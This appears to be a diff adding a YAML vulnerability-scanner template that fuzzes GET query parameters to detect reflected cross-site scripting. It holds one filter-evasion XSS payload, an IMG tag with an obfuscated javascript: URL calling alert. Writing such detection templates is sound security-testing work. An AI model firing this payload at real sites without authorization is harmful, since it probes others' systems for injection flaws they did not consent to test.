@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-img
+
+info:
+  name: Custom Reflection XSS Detection for IMG Tag
+  author: netbaan
+  severity: low
+  description: |
+    This template checks for potential reflection XSS vulnerabilities using a specified IMG tag payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
